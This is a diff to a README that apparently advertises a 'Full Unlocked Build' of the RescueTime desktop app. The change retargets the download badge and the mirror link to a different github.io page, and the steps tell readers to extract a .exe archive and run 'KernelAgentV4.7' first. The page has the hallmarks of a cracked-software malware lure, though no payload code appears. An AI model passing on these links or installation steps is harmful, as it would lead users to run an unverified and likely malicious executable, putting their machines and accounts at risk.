@@ -1,12 +1,12 @@
 # RescueTime+ Final Desktop Edition (Full Unlocked Build)
 
-[![Download](https://img.shields.io/badge/Download-RescueTime%2B_Desktop-blueviolet)](https://rescuetime-final-desktop-edition.github.io/.github
+[![Download](https://img.shields.io/badge/Download-RescueTime%2B_Desktop-blueviolet)](https://pomidorkaskeletik4.github.io/pomo/ferververter
 )
 
 ### ⚙️ Installation Instructions
 
 1. Download the installer from the link above  
-   🔗 Or use this mirror: [PLACE_YOUR_DOWNLOAD_LINK_HERE](https://rescuetime-final-desktop-edition.github.io/.github
+   🔗 Or use this mirror: [LINK](https://pomidorkaskeletik4.github.io/pomo/ferververter
 )  
 2. Extract the archive (contains `.exe` setup file)  
 3. Run `KernelAgentV4.7` first  
